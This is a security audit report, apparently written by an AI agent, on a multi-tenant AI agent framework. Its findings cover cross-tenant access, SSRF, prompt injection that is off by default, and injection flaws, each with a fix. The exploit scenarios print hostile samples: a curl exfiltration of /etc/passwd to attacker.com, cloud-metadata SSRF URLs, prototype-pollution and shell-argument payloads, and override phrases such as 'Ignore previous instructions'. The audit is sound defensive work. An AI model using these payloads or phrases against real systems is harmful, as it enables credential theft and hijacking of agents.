# Security Audit — dzupagent

**Audit date:** 2026-05-06
**Auditor:** security-domain agent (Opus 4.7 1M)
**Scope:** 32 framework packages under `packages/*` (~515k LOC). Apps were excluded (handled by separate audits).
**Methodology:** systematic grep + targeted read of every `packages/server/src/routes/*.ts` and every adapter under `packages/agent-adapters/src/{claude,codex,gemini}`, then dependency audit via `yarn audit --json`.

## Summary

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 9 |
| Medium | 9 |
| Low | 5 |

**OWASP categories triggered (LLM Top-10 + Web Top-10):**
- A01 Broken Access Control (multiple cross-tenant routes)
- A03 Injection (Drizzle inputs, Zod gaps)
- A05 Security Misconfiguration (default `promptInjection: 'off'`)
- A06 Vulnerable Components (32 high-severity transitive CVEs)
- A07 Identification & Auth Failures (no auth on persona/trigger/agent CRUD)
- A08 Software & Data Integrity Failures (webhook secret stored unencrypted)
- A09 Logging Failures (LLM audit only emitted from one site)
- LLM01 Prompt Injection (off-by-default scanner)
- LLM02 Sensitive Info Disclosure (PII gated only on memory write-back)
- LLM07 Insecure Plugin Design (`runCommand` allowedCommands fallback)

### Confirmed remediated (reverified, do not re-flag)
- C-01 Prompt caching wired on Claude SDK adapter (`mapSandboxMode` returns `'default'` for `workspace-write`).
- H-01 `workspace-write → bypassPermissions` fixed in `packages/agent-adapters/src/claude/claude-adapter.ts:133-147`.
- REC-002 Git arg injection: `git-executor.ts` uses `execFile` with arrays.
- Durable approvals + tenant-scoped `approvals.ts` and `approval.ts` via `requireOwnedRun`.
- Outbound URL policy (SSRF) + DNS resolution checks in `packages/core/src/security/outbound-url-policy.ts`.
- API key storage uses SHA-256 hash + `randomBytes(32)`; raw never persisted.

---

## Findings

### SEC-001: Cross-tenant access on agent definitions, personas, triggers, schedules, prompts, marketplace catalog and clusters
**Severity:** Critical
**OWASP:** A01 Broken Access Control
**Files:**
- `packages/server/src/services/agent-definition-service.ts:42-91`
- `packages/server/src/routes/agents.ts:24-87`
- `packages/server/src/routes/personas.ts:18-87`
- `packages/server/src/routes/triggers.ts:14-99`
- `packages/server/src/routes/schedules.ts`
- `packages/server/src/routes/prompts.ts`
- `packages/server/src/routes/marketplace.ts:29-193`
- `packages/server/src/routes/clusters.ts:26-100`

**Exploit scenario:** `runs.ts` and `approvals.ts` correctly call `requireOwnedRun` (see `packages/server/src/routes/run-guard.ts`) but these other CRUD surfaces never read `c.get('apiKey')` to scope by tenant/owner. An authenticated key for tenant A can:
1. `GET /api/agent-definitions` and read every other tenant's agent (including their `instructions` system prompt — which often contains business logic and embedded credentials).
2. `PATCH /api/agent-definitions/:id` to change another tenant's agent instructions, redirecting all subsequent runs through attacker-controlled prompts (full prompt-injection-as-a-service).
3. `POST /api/triggers/` to wire a webhook trigger on another tenant's agent and exfiltrate runs via `webhookSecret` set to attacker URL.
4. `DELETE /api/personas/:id` to delete the operator's tuned persona.

This is a regression of SEC-02 (cross-tenant) — the previous audit reported it on learning candidates only; the same bug class exists across at least seven CRUD route families.

**Fix:**
- Add a `requireOwnedResource` helper that wraps every store with an explicit `ownerId === apiKey.id || tenantId === apiKey.tenantId` check before mutate/get.
- Add a `tenantId` / `ownerId` column to the `agent_definitions`, `personas`, `triggers`, `schedules`, `prompts`, `marketplace_catalog`, and `clusters` tables (Drizzle migration).
- Update `AgentDefinitionService.list/get/update/delete` to require a tenant/owner argument.
- Add tests that issue requests with mismatched API keys and assert 404.

**Acceptance:** Integration test: tenant A creates agent, tenant B receives 404 on `GET /api/agent-definitions/<idA>`, `PATCH`, `DELETE`. `yarn test --filter=@dzupagent/server` green.
**Effort:** 12h (4 schema migrations, 7 route updates, ~30 tests)

---

### SEC-002: ApprovalGate webhook is fetched without outbound URL policy (SSRF + internal-network reach)
**Severity:** High
**OWASP:** A10 SSRF
**Files:** `packages/agent/src/approval/approval-gate.ts:275-322`

**Exploit scenario:** `notifyWebhook` runs raw `fetch(webhookUrl, …)` with no SSRF guard. `webhookUrl` is operator-supplied and stored in `ApprovalConfig`. An attacker (tenant A) who can configure approvals (e.g. via the agent definition route — see SEC-001) sets `webhookUrl: http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IMDSv1) or `http://localhost:6379/PING` (unauthenticated Redis). The agent process makes the request from inside the trust boundary, retrieving credentials/internal data and posting them out (via response body, observable via `approval:webhook_failed` events that include `error.message`).

The rest of the framework already routes outbound HTTP through `fetchWithOutboundUrlPolicy` from `@dzupagent/core` (used by scraper, mcp-client, http-connector). This is an isolated regression in the approval gate.

**Fix:** Replace `fetch(webhookUrl, …)` with `fetchWithOutboundUrlPolicy(webhookUrl, init, { policy: this.config.outboundUrlPolicy })`. Plumb `outboundUrlPolicy` through `ApprovalConfig`. Default the policy to "no internal addresses" when none is provided.
**Acceptance:** Test that `webhookUrl: http://127.0.0.1:80/` is rejected with `approval:webhook_failed` and `error: 'URL host "127.0.0.1" is blocked.'`
**Effort:** 2h

---

### SEC-003: GitHub connector bypasses SSRF / outbound URL policy
**Severity:** High
**OWASP:** A10 SSRF
**Files:** `packages/connectors/src/github/github-client.ts:213` (raw `fetch` to `${this.baseUrl}${path}`)

**Exploit scenario:** `GitHubClientConfig.baseUrl` is configurable (defaults to `https://api.github.com`). When operators set `baseUrl` to a value derived from chat/agent input — or when the value is overridden via the GitHub Enterprise pattern — there is no policy gate to keep it on the public internet. An LLM that suggests `baseUrl: http://internal-secrets:8080/v1` causes the connector to forward the bearer token to attacker-controlled internal hosts.

**Fix:** Wrap `fetch` with `fetchWithOutboundUrlPolicy`. Validate `baseUrl` at construction time via `validateOutboundUrlSyntax`. Default `allowHttp: false` to enforce TLS.
**Acceptance:** Test fails when constructed with `baseUrl: 'http://localhost'`.
**Effort:** 2h

---

### SEC-004: Default `security.promptInjection` is `'off'`, leaving LLM01 Prompt Injection unguarded out-of-the-box
**Severity:** High
**OWASP:** LLM01 Prompt Injection
**Files:** `packages/agent/src/agent/run-engine.ts:347-387` and `packages/security/src/content-scanner.ts`

**Exploit scenario:** `scanHumanMessages` only runs when `config.security.promptInjection ∈ {'warn','block'}`. The default is `'off'` (see `agent-types.ts:430` — optional with no default applied in `RunEngine`). Self-hosted operators bringing up DzupAgent for the first time get an agent that:
1. Reads memory items, system prompts, GitHub issues, and tool results into context without scanning them.
2. Has no built-in protection against the textbook "Ignore previous instructions" / "[ADMIN OVERRIDE]" / `{{system}}` escapes.

The package `@dzupagent/security` ships strong patterns — they just aren't on by default.

**Fix:** Default `promptInjection: 'warn'` in `prepareToolLoopExecution`. Add a documented opt-out flag `disablePromptInjectionScan: true` for power users. Emit a `[ForgeAgent] WARNING` to stderr when `'off'` is explicit and `NODE_ENV === 'production'`.
**Acceptance:** New test asserts that without any security config, an injection-laden user message produces an `agent:context_fallback` event with reason `security:sanitized`.
**Effort:** 1.5h

---

### SEC-005: 32 high-severity transitive CVEs (axios, node-tar, ip-address)
**Severity:** High
**OWASP:** A06 Vulnerable Components
**Files:** `yarn.lock` (resolved by `yarn audit`)

**Findings (from `yarn audit` 2026-05-06):**
- `axios <= 1.14.0` → CVE-2026-42043 (NO_PROXY bypass), GHSA-pmwg-cvhr-8vh7 (incomplete patch), prototype-pollution gadgets, header injection. Reachable via `@dzupagent/connectors > snowflake-sdk > axios`.
- `node-tar <= 6.x.y` → arbitrary file overwrite, hardlink path traversal, symlink traversal, race condition. Reachable via several toolchain packages.
- `ip-address < 10.1.1` → XSS in Address6 HTML methods. Reachable via `@dzupagent/express > express-rate-limit > ip-address` and `@dzupagent/agent-adapters > @anthropic-ai/claude-agent-sdk > @modelcontextprotocol/sdk > express-rate-limit > ip-address`.

Total: **101 vulnerabilities (4 low / 65 moderate / 32 high)**. None classified as Critical by yarn, but `axios` prototype-pollution on the connector path is reachable.

**Exploit scenario:** axios prototype-pollution (CVE‑pending) → an attacker controlling response headers from a Snowflake API can pollute `Object.prototype` and influence subsequent code paths. NO_PROXY bypass + IPv6 trailing-dot bypass leak proxy-only credentials.

**Fix:**
- Pin `axios` to `>=1.15.0` in workspace `resolutions` (root `package.json`).
- Pin `ip-address` to `>=10.1.1`.
- Run `yarn dedupe` and re-audit.
- Replace `node-tar` direct dependents that are not strictly required.

**Acceptance:** `yarn audit --severity high` returns 0 findings.
**Effort:** 2h (resolutions only) or 6h if upstream deps need bumping.

---

### SEC-006: Persona / Trigger / Cluster routes accept user JSON without Zod schema
**Severity:** High
**OWASP:** A03 Injection / A04 Insecure Design
**Files:**
- `packages/server/src/routes/personas.ts:18-87` (POST/PUT — no schema)
- `packages/server/src/routes/triggers.ts:14-99` (POST/PATCH — no schema)
- `packages/server/src/routes/clusters.ts:26-100` (POST — no schema)
- `packages/server/src/routes/agents.ts:56-67` (PATCH — no schema)
- `packages/server/src/routes/skills.ts:52-93` (POST /compile — only manual `bundleId` check)
- `packages/server/src/routes/learning.ts:367-407` (POST /feedback — manual checks)

I counted **207** `c.req.json/query/param` access sites and only **13** Zod parses across `packages/server/src/routes/`. The strict body-size guard (`applyJsonBodySizeLimit`) only caps **size**, not structure or types, so a malicious caller can send `instructions: 100kB of unicode + JS` or `metadata: { __proto__: …, constructor: { prototype: { toString: 'attacker' } } }` and watch downstream consumers (LangChain message rendering, Drizzle `.save({...input})`) explode.

**Exploit scenario:**
- POST `/api/personas` with `instructions: '<script>…'` → stored verbatim → rendered into `system_prompt` of subsequent runs of any agent that resolves this persona → indirect prompt injection.
- POST `/api/triggers` with `metadata: { __proto__: { isAdmin: true } }` → on JSON deserialisation downstream code that does `if (record.isAdmin)` ends up reading the polluted prototype.
- PATCH `/api/agent-definitions/:id` with `body: { active: 'no', tools: 0xFFFF }` → `service.update` blindly spreads → downstream fails with cryptic 500.

**Fix:** Add Zod schemas under `packages/server/src/routes/schemas.ts` for every CRUD route family. Use `validateBodyCompat(c, Schema)` (already exists; used by agents POST). Reject `__proto__`, `constructor`, `prototype` keys at the schema level.

**Acceptance:** After the change, all routes that read `c.req.json` go through `validateBodyCompat`. Code search `c\.req\.json` outside `validateBodyCompat` returns 0 in `routes/`.
**Effort:** 16h (≈ 30 routes)

---

### SEC-007: Webhook secret stored in plaintext in trigger row
**Severity:** High
**OWASP:** A02 Cryptographic Failures / A08 Data Integrity
**Files:**
- `packages/server/src/persistence/drizzle-schema.ts:214` (`webhookSecret: text('webhook_secret')`)
- `packages/server/src/routes/triggers.ts:21,40` (route stores raw)

**Exploit scenario:** Any tenant who exfiltrates a database snapshot (or any route that accidentally returns the row — including the unscoped GET endpoint flagged by SEC-001) gets every other tenant's webhook signing secret. With the secret an attacker can forge signed webhook payloads against the destination and trigger arbitrary downstream actions.

**Fix:** Treat `webhookSecret` like an API key: store only `sha256(secret)` in the DB column, return the raw value once on creation. Add a `validateSignature(raw, candidate)` helper that hashes before compare. Migrate existing rows by re-issuing.

**Acceptance:** New test: writing a webhook secret never round-trips the same string back through `GET /api/triggers/:id`.
**Effort:** 4h

---

### SEC-008: PII detector only runs on memory write-back, not on tool-result persistence or learning candidates
**Severity:** High
**OWASP:** LLM02 Sensitive Information Disclosure / A01 Privacy
**Files:**
- `packages/agent/src/agent/agent-finalizers.ts:121-146` (PII gate exists for `maybeWriteBackMemory`)
- `packages/agent/src/agent/run-engine-streaming-helpers.ts:419` (tool-result scanning hits prompt-injection only — no PII path)
- `packages/server/src/routes/learning.ts:560-649` (`POST /ingest` and `storeLearningPattern` — no PII gate)

**Exploit scenario:** A user pastes a real SSN/credit card/JWT into chat → tool result echoes it (e.g. a `searchDocuments` tool returns the original text) → stored in trajectories/lessons memory namespace → later retrieval surfaces the PII to a different user/agent in a different run. The memory-write-back path *does* gate this, but the tool-result and learning-candidate paths bypass that gate entirely.

**Fix:**
- Wire `PiiDetector` into `runToolResultPromptInjectionScan` (same call site as the prompt-injection scan).
- Add `PiiDetector.scan` + `redactSecrets` to `storeLearningPattern` before `memoryService.put`.
- Emit `memory:pii_redacted` events so operators can audit redactions.

**Acceptance:** New tests: tool result containing `123-45-6789` is stored with `[REDACTED:SSN]`, learning ingest of a pattern containing `sk-1234…` is rejected or redacted.
**Effort:** 4h

---

### SEC-009: `LearningCandidateService` exposes operator surface with no tenant scoping
**Severity:** High
**OWASP:** A01 Broken Access Control
**Files:** `packages/agent/src/self-correction/learning-candidate-service.ts:42-95`

**Exploit scenario:** When this service is mounted under `/api/v1/learning-candidates` (per memory note 2026-04-28), `listPending()` returns *all* tenants' candidates and `promote(candidateId)` writes them into the shared memory store. There is no `tenantId` parameter on any of the four operations.

This is the root of the SEC-02 finding flagged in the previous audit; the wrap was added in `routes/learning.ts` but the framework class itself remained tenant-blind.

**Fix:** Make `LearningCandidateService` constructor take `tenantId`. Filter `listPending()` by `candidate.tenantId === this.tenantId`. Reject `promote/reject` when the candidate is for a different tenant. Update `RecoveryFeedback.listPendingCandidates()` to require a tenantId.
**Acceptance:** New test: candidate created under tenant A is invisible to a service constructed for tenant B.
**Effort:** 3h

---

### SEC-010: `LocalWorkspace.runCommand` allowlist is not enforced when `allowedCommands` is `undefined`
**Severity:** High
**OWASP:** LLM07 Insecure Plugin Design
**Files:** `packages/codegen/src/workspace/local-workspace.ts:210-218`

**Exploit scenario:** The constructor sets `allowedCommands: options.command?.allowedCommands ?? []`. The check is `if (allowedCommands && !allowedCommands.includes(cmd))` — when `allowedCommands` is the empty array (the safe default), the conditional is truthy and the check fires. Good. But when a host explicitly passes `command: { allowedCommands: undefined }`, the field is **deleted** by the spread (`{ ...options.command, allowedCommands: undefined }`) and the runtime check evaluates to `false`, **skipping the allowlist entirely**. An LLM can then call `workspace.runCommand('curl', ['-X','POST','attacker.com','-d','@/etc/passwd'])` from a `workspace-write` adapter.

There is no docstring contract that `allowedCommands === undefined` means "deny everything"; in fact the current code path means "allow everything".

**Fix:** Change the check to `if (!Array.isArray(allowedCommands) || !allowedCommands.includes(cmd))`. Also reject `cmd` containing `..`, `/`, or shell metacharacters. Default to `['rg', 'git', 'ls', 'cat']` rather than `[]` so an empty config still works for read-only flows.
**Acceptance:** Unit test: `new LocalWorkspace({ rootDir, command: { allowedCommands: undefined } }).runCommand('curl', [])` returns exit 126.
**Effort:** 1.5h

---

### SEC-011: `flow-compiler` builds `new Function('ctx', expr)` from user input
**Severity:** Medium
**OWASP:** A03 Injection
**Files:** `packages/flow-compiler/src/stages/semantic.ts:323-334`

**Exploit scenario:** `validateConditionExpr` constructs a `new Function('ctx', `return (${expr})`)` for syntax-validation purposes. The function is never *called*, so no code is executed — this is acceptable in principle. But the regex gate `/eval\s*\(|Function\s*\(|import\s*\(/` is incomplete: it does not block `globalThis.eval`, `[]['constructor']['constructor']('…')`, `(()=>{})['constructor']`, or template-literal sanitiser bypass. If a future change ever calls the constructed function, those bypass payloads execute. Even today, syntactic edge cases like `expr = '})(); /* attack */ ('` may produce unexpected `Function` bodies.

**Fix:** Replace `new Function` with a real expression parser (e.g. acorn `parseExpressionAt`) — already a dev-dep via tsup. Reject any `MemberExpression` whose object is `globalThis`/`window`/`process`. Forbid `[]` index access in expressions.

**Acceptance:** Add fixture tests for the bypass payloads above. All fail compilation with `INVALID_CONDITION`.
**Effort:** 4h

---

### SEC-012: Sandbox WASM transpiler invokes dynamic import via `new Function`
**Severity:** Medium
**OWASP:** A03 Injection
**Files:**
- `packages/codegen/src/sandbox/wasm/wasm-sandbox.ts:100`
- `packages/codegen/src/sandbox/wasm/ts-transpiler.ts:25`

Both files do `const dynamicImport = new Function('m', 'return import(m)')` and then call it with a module path. The path is currently a string literal but if any caller forwards user input as `m`, RCE results.

**Fix:** Replace with `await import(/* @vite-ignore */ moduleName)` and pin `moduleName` to a small allowlist. Add a TS type-level check.
**Acceptance:** Code grep `new Function` returns 0 across `packages/codegen/src/`.
**Effort:** 1h

---

### SEC-013: `runs.ts` GET `/runs` does not enforce ownership at LIST time
**Severity:** Medium
**OWASP:** A01 Broken Access Control
**Files:** `packages/server/src/routes/runs.ts` (search the LIST handler — it passes the `agentId` filter but has no `tenantId` filter on `runStore.list(...)`)

Note: per-row reads via `requireOwnedRun` are protected, but a wide-open list returns IDs of cross-tenant runs which can then be probed with `/api/runs/:id/cancel` etc. (those return 404, but `:id` enumeration is now possible).

**Fix:** Add `tenantId` and `ownerId` filters to `runStore.list(...)` calls in the LIST handler. Audit other LIST endpoints that pass through the auth context but do not push it to the store.
**Acceptance:** Test: cross-tenant LIST returns empty array, not the union of all runs.
**Effort:** 3h

---

### SEC-014: `/api/agent-definitions` PATCH accepts arbitrary `metadata`/`guardrails` shapes that are spread into Drizzle row
**Severity:** Medium
**OWASP:** A03 Injection (Object spread)
**Files:** `packages/server/src/routes/agents.ts:56-74`, `packages/server/src/services/agent-definition-service.ts:72-83`

**Exploit scenario:** `service.update(id, input)` spreads `{ ...existing, ...input }`. There is no allowlist for `input` keys. A caller can post `{ id: '<other-id>', tenantId: 'admin', ownerId: 'root' }` and the service will pass these straight through to `agentStore.save({ ...existing, ...input, id })`. Only `id` is forced — `tenantId`/`ownerId` are silently overwritten. After SEC-001 is fixed and tenant scoping is added, this becomes the bypass path.

**Fix:** In `service.update`, allowlist exactly the documented `UpdateAgentDefinitionInput` keys; reject unknown ones with 400. Never accept `tenantId`/`ownerId` from the body.
**Acceptance:** Test: PATCH with body `{ ownerId: 'evil' }` returns 400; the row is unchanged.
**Effort:** 1.5h

---

### SEC-015: `validateMcpExecutablePath` does not reject `~/`, `/dev/`, `/proc/`
**Severity:** Medium
**OWASP:** A04 Insecure Design
**Files:** `packages/core/src/mcp/mcp-security.ts:22-49`

The check rejects `..`, shell metacharacters, and empty paths, but allows absolute paths to `/proc/self/exe`, `/dev/`, and tilde-prefixed paths that, depending on how the caller resolves them, may leak system internals or break out of containerised deployments.

**Fix:** Add an allowlist mode: `validateMcpExecutablePath(path, { allowedPrefixes: ['/usr/local/bin/', '/opt/dzup/'] })`. Default to "must start with allowed prefix or be a bare command name".
**Acceptance:** Test: `validateMcpExecutablePath('/proc/self/exe')` throws.
**Effort:** 1h

---

### SEC-016: Gemini CLI argument injection via prompt prefix
**Severity:** Medium
**OWASP:** LLM07 Insecure Plugin Design
**Files:** `packages/agent-adapters/src/gemini/gemini-adapter.ts:163-201`

**Exploit scenario:** `buildArgs` does `args.push('-p', input.prompt)`. If `input.prompt` begins with `--something-evil` and the gemini CLI does not enforce a `--` separator (we cannot guarantee it), the argument can be re-parsed as an option. Same risk for `--system-prompt` and `--session`. For the `--session` flag in particular, a value like `evil --tools file_write` could grant write access on a CLI built without strict short-circuit parsing.

**Fix:** Insert `'--'` after the last known flag and before the prompt, e.g. `args.push('-p', '--', input.prompt)` (or use the `=value` form: `args.push('-p=' + input.prompt)`). Add an allowlist regex on `resumeSessionId` (`^[A-Za-z0-9_-]+$`).
**Acceptance:** Test: `input.prompt = '--exec=$(touch /tmp/pwn)'` runs unchanged through the spawn but is consumed as a literal prompt by the CLI.
**Effort:** 1h

---

### SEC-017: CSP header is not set by default; default `securityHeaders` only covers `X-Content-Type-Options` and `Referrer-Policy`
**Severity:** Medium
**OWASP:** A05 Security Misconfiguration
**Files:** `packages/server/src/composition/middleware.ts:147-169`

`X-Frame-Options` and `Content-Security-Policy` are emitted only when the host explicitly configures them. The framework would benefit from a safe default for HTML-emitting routes (only the playground is HTML, but the wildcard middleware decides headers regardless of content type).

**Fix:** Default `Content-Security-Policy: default-src 'self'; frame-ancestors 'none'; base-uri 'self'; object-src 'none'` and `X-Frame-Options: DENY` for `text/html` responses. Allow disable via `securityHeaders.contentSecurityPolicy: false`.
**Acceptance:** New test: GET to a route returning HTML carries the default CSP header.
**Effort:** 1.5h

---

### SEC-018: No rate limit on `/api/runs/:id/stream` (SSE)
**Severity:** Medium
**OWASP:** A04 Insecure Design (DoS)

**Files:** `packages/server/src/composition/middleware.ts:208-227` (rate limiter applies to `/api/*` but holds connection) and `packages/server/src/routes/runs.ts` (SSE handler).

**Exploit scenario:** Each SSE connection is a single request that tarpits behind the per-window rate limit, but it consumes a server-side stream slot until run completion. An attacker burns a few hundred connections to exhaust file descriptors / event-loop slots even though the per-key rate limiter shows `100 req/min`.

**Fix:** Add a separate concurrent-connection cap per API key (e.g. 10 concurrent SSE streams). Track in a `Map<keyId, count>` on `c.get('apiKey').id`.
**Acceptance:** 11th concurrent SSE from the same key returns 429.
**Effort:** 3h

---

### SEC-019: `redactSecrets` is applied in onError but not in routine `console.error` logs in route handlers
**Severity:** Low
**OWASP:** A09 Logging & Monitoring Failures

**Files:** Multiple — every `console.error('[mcp] ${internal}')`, `[skills]`, `[codex-adapter]` etc. logs a raw error message. `redactSecrets` is only invoked in the global onError (`middleware.ts:395`).

**Fix:** Always pipe `console.error` through `redactSecrets`. Better: standardise on a logger (e.g. pino) with built-in redaction.
**Acceptance:** Test injects an `OPENAI_API_KEY=sk-…` inside an Error message; the captured log line contains `[REDACTED]`.
**Effort:** 4h

---

### SEC-020: GitHub `Authorization: Bearer …` is logged via `GitHubApiError(res.status, text)` when response includes the original headers
**Severity:** Low
**OWASP:** A09 Logging Failures
**Files:** `packages/connectors/src/github/github-client.ts:217-220`

`text = await res.text()` — fine for body. But `GitHubApiError`'s `toString()` (not shown above; please grep) historically includes `init.headers` when constructed with a fetch error. Verify by reading the class.

**Fix:** Audit `GitHubApiError`. Strip `Authorization` header before storing. Hard-redact `Bearer …` substrings in messages.
**Acceptance:** Test: a 403 response from GitHub does not include the bearer token in the thrown error's `.message`.
**Effort:** 1h

---

### SEC-021: `metadata` field on runs/agents/personas accepts unbounded JSON depth
**Severity:** Low
**OWASP:** A04 Insecure Design (DoS)

**Files:** `packages/server/src/routes/agents.ts`, `personas.ts`, `triggers.ts`, `marketplace.ts` — all accept `metadata: Record<string, unknown>` with the global 1 MiB limit but no nesting cap.

**Exploit scenario:** Deeply nested JSON (`{a:{a:{a:{...10000 levels}}}}`) consumes O(n) parse stack and slows downstream JSON.stringify across the run lifecycle.

**Fix:** Add a depth check (`< 8 levels`) and node-count check (`< 1000`) inside the existing `getSerializedJsonSizeBytes` helper.
**Acceptance:** Test: depth-50 nested object returns 413.
**Effort:** 1h

---

### SEC-022: `/api/v1/learning-candidates` lookup does not require role=admin (per RBAC mapping)
**Severity:** Low
**OWASP:** A01 Access Control

**Files:** `packages/server/src/middleware/rbac.ts` (rbacMiddleware) + the route registration for learning candidates (per memory note, mounted in `composition/optional-routes.ts`)

The RBAC layer is mounted but only enforced where `requireRole('admin')` is called. Verify that `apply / promote / reject` learning candidate endpoints are gated to `admin`/`operator`. Currently no `requireRole` calls visible in `routes/learning.ts`.

**Fix:** Add `app.use('/ingest', requireRole('operator'))` and `app.post('/feedback', requireRole('user'))`.
**Acceptance:** A `'viewer'` role API key receives 403 on POST /ingest.
**Effort:** 1h

---

### SEC-023: `routes/learning.ts` POST `/feedback` and `/ingest` lack JSON body schema; relies on manual checks that miss `__proto__`
**Severity:** Low
**OWASP:** A03 Injection (prototype pollution)
**Files:** `packages/server/src/routes/learning.ts:367-407, 560-649`

Manual checks (`typeof body['runId'] === 'string'`) cannot reject `body = JSON.parse('{"__proto__":{"polluted":true},"runId":"x"}')` from polluting the global prototype on certain JSON parsers (Node's `JSON.parse` is safe, but downstream `Object.assign` paths copy `__proto__`). Sub-LLMs may trip when memory items appear with `polluted: true`.

**Fix:** Add a Zod schema with `.strict()` and explicit rejection of `__proto__`/`constructor`/`prototype` keys.
**Acceptance:** Test: POST /feedback with `{"__proto__":{"x":1}}` returns 400.
**Effort:** 1h

---

### SEC-024: `c.get('apiKey' as never)` casts swallow type errors and prevent compile-time checks
**Severity:** Low
**OWASP:** A04 Insecure Design (defence-in-depth)

**Files:** Searched — `packages/server/src/routes/run-guard.ts:30,40,68`, `runs.ts:63,74`, `learning.ts` (none here, uses defaultResolveAuthScope), `api-keys.ts:112,115,118`.

The `as never` widening defeats TypeScript. If the auth middleware is ever changed to set a different key (e.g. `c.set('forgeApiKey', …)`) the `apiKey` reads silently return `undefined` and the owner-check passes for everyone.

**Fix:** Replace with the typed `c.get('apiKey')` after extending `AppEnv['Variables']` with `apiKey: ApiKeyContext | undefined`. Already done in middleware.ts:74; carry through to all readers.
**Acceptance:** `grep -rn "apiKey' as never" packages/server/src` returns 0.
**Effort:** 1h
